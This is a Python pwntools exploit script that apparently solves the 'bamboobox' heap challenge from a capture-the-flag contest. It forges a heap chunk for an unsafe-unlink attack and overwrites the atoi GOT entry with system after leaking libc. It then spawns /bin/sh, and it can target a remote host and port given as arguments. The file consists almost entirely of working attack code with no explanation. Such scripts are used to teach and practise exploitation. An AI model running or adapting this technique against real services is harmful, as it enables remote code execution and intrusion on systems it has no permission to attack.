#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./bamboobox",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def add(length,name):
    con.sendlineafter("choice:","2")
    con.sendlineafter("name:",str(length))
    con.sendlineafter("item:",name)
def modify(index,length,name):
    con.sendlineafter("choice:","3")
    con.sendlineafter("item:",str(index))
    con.sendlineafter("name:",str(length))
    con.sendafter("item:",name)
def remove(index):
    con.sendlineafter("choice:","4")
    con.sendlineafter("item:",str(index))

def show():
    con.sendlineafter("choice:","1")
    con.recvuntil(":")
    data=con.recvuntil("Bam")
    return data
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    magic = 0x400d49
    add(0x80,"a"*4)
    add(0x80,"a"*4)
    add(0x80,"a"*4)
    itemlist=0x6020c0

    fake_chunk=p64(0)#pre_size
    fake_chunk+=p64(0x81)#size
    fake_chunk+=p64(itemlist+0x8-0x18)#fd->bk==P
    fake_chunk+=p64(itemlist+0x8-0x10)#bk->fd==P
    fake_chunk+="a"*0x60
    fake_chunk+=p64(0x80)#pre_size
    fake_chunk+=p64(0x90)#size with flag 1
    modify(0,len(fake_chunk),fake_chunk)
    z()
    remove(1)
    payload=flat([0,0,0x30,code.got["atoi"]])
    modify(0,len(payload),payload)
    s=show()
    libc_atoi=u64(s[1:7].ljust(8,"\x00"))
    print hex(libc_atoi)
    libc=libc_atoi-0x36e80
    libc_system=libc+0x45390
    modify(0,8,p64(libc_system))
    con.sendline("/bin/sh")
exploit()
con.interactive()
